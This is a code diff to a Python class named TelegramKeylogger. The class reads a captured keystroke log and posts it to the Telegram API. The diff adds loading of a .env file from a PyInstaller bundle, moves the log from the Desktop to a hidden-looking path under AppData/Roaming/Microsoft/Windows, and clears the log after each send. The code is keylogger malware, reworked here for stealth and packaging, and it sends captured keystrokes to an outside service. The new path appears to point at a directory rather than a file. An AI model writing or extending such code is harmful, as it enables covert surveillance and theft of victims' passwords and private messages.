@@ -1,11 +1,22 @@
 import io
 import os
+import sys
 import time
 import requests
 import getpass
 from dotenv import load_dotenv
 
-load_dotenv()
+
+def resource_path(folder, file):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+
+    return os.path.join(base_path, folder, file)
+
+dotenv_path = resource_path('data', '.env')
+load_dotenv(dotenv_path=dotenv_path)
 
 username = getpass.getuser()
 
@@ -19,10 +30,10 @@ class TelegramKeylogger:
 
     def send_to_telegram(self):
         try:
-            if not os.path.exists(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt') or os.path.getsize(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt') == 0:
+            if not os.path.exists(f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows') or os.path.getsize(f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows') == 0:
                 return False
 
-            with open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', "r", encoding="utf-8") as f:
+            with open(f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows', "r", encoding="utf-8") as f:
                 log_content = f.read()
 
             if not log_content.strip():
@@ -42,15 +53,15 @@ class TelegramKeylogger:
             response = requests.post(url, files=files, data=data, timeout=30)
 
             if response.status_code == 200:
-                open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', 'w').close()
+                open(f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows', 'w').close()
                 return True
             else:
-                open("logfile.txt", 'w').close()
+                open(f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows', 'w').close()
                 print(f"Telegram API error: {response.status_code}")
                 return False
 
         except Exception as e:
-            open("logfile.txt", 'w').close()
+            open(f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows', 'w').close()
             print(f"Send error: {e}")
             return False
 
